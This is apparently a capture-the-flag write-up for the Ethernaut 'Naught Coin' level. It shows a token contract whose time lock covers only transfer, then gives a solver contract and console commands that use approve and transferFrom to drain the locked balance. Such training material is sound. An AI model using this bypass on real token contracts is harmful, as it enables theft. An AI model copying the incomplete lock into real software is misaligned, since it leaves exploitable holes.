![Naught Coin](/assets/img/BigLevel15.svg)

- [Challenge](#challenge)
- [Solution](#solution)
- [References](#references)
   
# Challenge

The level states:

> NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.
> 
> Things that might help
> 
> - The [ERC20](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md) Spec
> - The [OpenZeppelin](https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts) codebase

And presents us the following code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';

contract NaughtCoin is ERC20 {
// string public constant name = 'NaughtCoin';
// string public constant symbol = '0x0';
// uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }
  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  } 
}
```

# Solution

As usual, we start by reading the code and interacting with the contract. The level states that we should reduce our token balance to 0.

We can run:

```javascript
await contract.balanceOf(player).then(v=>v.toString())
'1000000000000000000000000'
```

If we look at the contract's code, we see that it says `//uint public constant decimals = 18;` which means that we have to divide the previously retrieved value by $10^{18}$. Meaning that we have 1000000 Naught Coins.

Now, if we try to transfer them, the contract will not let us, as there is a modifier for the `transfer` function, named `lockTokens`...

If we have a look at that modifier's code, we will note that it won't let us transfer the tokens for 10 years! (As stated in the level's instructions).

So, what can we do? Let's look into the [ERC20.sol library from OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol) (note that Naught Coin extends from this library: `contract NaughtCoin is ERC20`). If we read the documentation of the ERC20 tokens, we will find that there are two ways to transfer tokens, one is the function `transfer` (which we already discarded as we would need to wait 10 years) and there also exists a function called `transferFrom`... Now, this function doesn't have any modifier, could we use it then?

According to the docs:
> **transferFrom(address sender, address recipient, uint256 amount) → bool**
> 
> Moves `amount` tokens from `sender` to `recipient` using the allowance mechanism. `amount` is then deducted from the caller’s allowance.

What's the allowance mechanism then?

> **allowance(address owner, address spender) → uint256**
> 
> Returns the remaining number of tokens that spender will be allowed to spend on behalf of owner through transferFrom. This is zero by default.
> 
> This value changes when `approve` or `transferFrom` are called.

And, what does approve do?

> **approve(address spender, uint256 amount) → bool**
>
> Sets amount as the allowance of spender over the caller’s tokens.

Then, to recap, there is a mechanism to allow another party to send tokens in our behalf, but in order for them to do it, they need our approval beforehand.

So let's write a contract that can transfer these tokens for us:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./NaughtCoin.sol";

contract Solver {
    NaughtCoin naughtCoin;

    constructor(address _naughtCoinAddress) {
        naughtCoin = NaughtCoin(_naughtCoinAddress);
    }

    function solve(address _from, uint256 _value) public {
        naughtCoin.transferFrom(_from, address(this), _value);
    }
}
```

Now, let's solve the challenge:

1. First of all, we, as owners of the tokens, need to approve the spender (the Solver contract) to transfer tokens from our balance: `contract.approve(SOLVER_ADDRESS, '1000000000000000000000000')
` 
2. Now we can run `solve(OUR_ADDRESS, 1000000000000000000000000)`. Which will run `transferFrom` from our balance into the Solver's balance.

Notice that this will leave the tokens unusable and untransferable as we haven't added any routine in the contract to transfer the tokens into another wallet.

If we now check the balance again:

```javascript
await contract.balanceOf(player).then(v=>v.toString())
'0'
```

So we did it!!! We solved the challenge!!!

![Well done](/assets/img/ethernaut_solved.png)

_Note:_ There exists another way to solve this level without having to code a contract. For this we need another account to transfer the tokens to.

```javascript
await contract.balanceOf(player).then(v=>v.toString())
'1000000000000000000000000'

contract.approve(player, '1000000000000000000000000')

contract.transferFrom(player, player_second_address, '1000000000000000000000000')

await contract.balanceOf(player).then(v=>v.toString())
'0'

await contract.balanceOf(player_second_address).then(v=>v.toString())
'1000000000000000000000000'
```

# References

- [SWC-105](https://swcregistry.io/docs/SWC-105)